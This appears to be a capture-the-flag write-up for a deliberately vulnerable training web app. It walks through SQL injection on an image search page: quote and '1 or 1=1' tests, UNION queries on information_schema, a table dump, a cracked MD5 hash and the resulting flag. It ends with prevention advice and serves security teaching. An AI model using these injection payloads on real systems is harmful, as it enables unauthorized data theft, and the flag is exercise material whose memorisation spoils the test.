# Description

Visiting the 'searchimg' page, it display a search field that search for members by id.

Trying a basic sql injection test, putting a single quote in the search field and submit.

We got an sql syntax error:
`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1`

Then trying `1 or 1=1` will gives all members in the database:

```html
ID: 1 or 1=1 
First name: one
Surname : me

ID: 1 or 1=1 
First name: two
Surname : me

ID: 1 or 1=1 
First name: three
Surname : me

ID: 1 or 1=1 
First name: Flag
Surname : GetThe
```

# Attack

Now let's try to determine the SQL request 

As it seems from the last input the SQL request only retreive 2 columns so we will need to inject those columns with data from database.

Now let's look for all the databases names in the database using this sql injection.

    0 UNION select table_name,column_name from information_schema.columns

As you will see below we found an interesting database informations, `list_images` That contains a comment for each image I guess. It's catchy.


```html
ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: list_images
Surname : id

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: list_images
Surname : url

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: list_images
Surname : title

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: list_images
Surname : comment
```

Now we will try to see what all images has on the `commet` Column, It may be something interesting.

    0 UNION select concat(id, url),concat(title, comment) from list_images

```html
ID: 0 UNION select concat(id, url),concat(title, comment) from list_images 
Title: NsaAn image about the NSA !
Url : 1https://fr.wikipedia.org/wiki/Programme_

ID: 0 UNION select concat(id, url),concat(title, comment) from list_images 
Title: 42 !There is a number..
Url : 2https://fr.wikipedia.org/wiki/Fichier:42

ID: 0 UNION select concat(id, url),concat(title, comment) from list_images 
Title: GoogleGoogle it !
Url : 3https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 0 UNION select concat(id, url),concat(title, comment) from list_images 
Title: EarthEarth!
Url : 4https://en.wikipedia.org/wiki/Earth#/med

ID: 0 UNION select concat(id, url),concat(title, comment) from list_images 
Title: Hack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5borntosec.ddns.net/images.png
```

As you can see the last image Has this string result `Hack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

Now decripting it with md5: 1928e8083cf461a51303633093573c46 : albatroz

albatroz (sha256): f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Prevention

To prevent SQL injection vulnerabilities, follow these measures:

- Use prepared statements with parameterized queries to separate SQL code from user input.
- Implement input validation and sanitize user inputs to prevent malicious input.
- Employ a Web Application Firewall (WAF) to detect and block malicious SQL injection attempts.
